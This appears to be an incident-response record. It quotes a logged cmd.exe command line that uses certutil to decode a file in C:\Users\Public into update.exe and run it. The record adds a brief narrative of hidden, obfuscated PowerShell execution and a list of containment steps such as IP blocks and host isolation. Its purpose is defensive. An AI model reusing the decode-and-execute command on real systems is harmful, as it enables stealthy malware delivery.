"CommandLine": "cmd.exe /c \"FOR /F \"tokens=*\" %i IN ('type C:\\Users\\Public\\config.dat') DO certutil.exe -decode %i C:\\Users\\Public\\update.exe && C:\\Users\\Public\\update.exe\"",

attack_narrative: A heavily obfuscated PowerShell command was executed on DESKTOP-DEV (ProcessID 1440) using ExecutionPolicy Bypass and WindowStyle Hidden flags, indicating a fileless malware execution technique designed to evade endpoint detection.
containment_actions: BLOCK IP 185.220.101.5 at perimeter firewall and all internal segment boundaries
BLOCK IP 192.168.1.105 at perimeter firewall and all internal segment boundaries
ISOLATE host DESKTOP-DEV immediately — disconnect from all network segments
ISOLATE host DESKTOP-DEV-99A immediately — disconnect from all network segments
PRESERVE all Sysmon, network, and endpoint logs for legal/forensic proceedings
NOTIFY CISO and legal team — assess breach notification obligations
